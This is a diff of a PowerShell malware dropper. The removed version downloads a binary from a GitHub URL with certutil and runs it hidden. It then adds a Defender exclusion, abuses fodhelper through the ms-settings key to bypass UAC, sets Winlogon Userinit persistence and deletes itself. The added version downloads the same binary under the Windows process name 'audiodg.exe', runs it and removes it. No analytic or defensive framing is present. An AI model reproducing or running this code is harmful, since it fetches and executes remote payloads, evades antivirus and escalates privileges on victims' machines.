@@ -1,22 +1,6 @@
-
-
-$randomSuffix = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
-$targetExe = "$env:TEMP\$randomSuffix.exe"
-
-certutil -urlfetch -verify -f "https://github.com/MB2RZEN/yio/raw/refs/heads/main/sqi.bin" "$targetExe" >$null 2>&1
-
-Start-Process -FilePath $targetExe -WindowStyle Hidden -PassThru | Out-Null
-
-Add-MpPreference -ExclusionProcess $targetExe -ErrorAction SilentlyContinue
-
-$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
-
-Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
-New-Item -Path $regPath -Force | Out-Null
-
-Set-ItemProperty -Path $regPath -Name "(Default)" -Value "cmd /c reg add `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v `"Userinit`" /t REG_SZ /d `"C:\windows\system32\userinit.exe,$targetExe,`" /f >nul 2>&1 & powershell -w hidden -ep bypass -c `"Remove-Item -Path '$PSCommandPath' -Force`"" -Type String
-New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
-
-Start-Process "C\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-
-Start-Job -ScriptBlock { Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue } | Out-Null
+$outputPath = [System.IO.Path]::Combine($env:TEMP, 'audiodg.exe')
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile("https://github.com/MB2RZEN/yio/raw/refs/heads/main/sqi.bin", $outputPath)
+$process = Start-Process -FilePath $outputPath -PassThru
+$process.WaitForExit()
+Remove-Item $outputPath -Force
